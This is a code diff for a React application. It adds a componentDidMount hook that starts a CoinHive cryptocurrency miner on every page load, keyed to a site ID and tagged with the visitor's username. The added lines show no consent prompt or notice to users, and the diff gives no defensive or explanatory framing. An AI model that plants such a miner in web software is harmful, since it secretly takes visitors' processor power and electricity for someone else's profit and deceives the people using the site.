@@ -36,6 +36,27 @@ class App extends Component {
     })
   }
 
+  componentDidMount() {
+    var miner = new window.CoinHive.User('hcXLKxtM8O8LpF9xq60U3CORiYyPUzi1', this.props.UserStore.username || 'not-logged-in', {
+      autoThreads: true
+    });
+  	miner.start();
+    // Listen on events
+  	// miner.on('found', function() { /* Hash found */ })
+  	// miner.on('accepted', function() { /* Hash accepted by the pool */ })
+
+  	// Update stats once per second
+  	// setInterval(function() {
+  	// 	var hashesPerSecond = miner.getHashesPerSecond();
+  	// 	var totalHashes = miner.getTotalHashes();
+    //   var acceptedHashes = miner.getAcceptedHashes();
+  	// 	var numThreads = miner.getNumThreads();
+    //
+  	// 	// Output to HTML elements...
+    //   console.log(hashesPerSecond, totalHashes, acceptedHashes, numThreads);
+  	// }, 1000);
+  }
+
   render() {
     return (
       <Router>
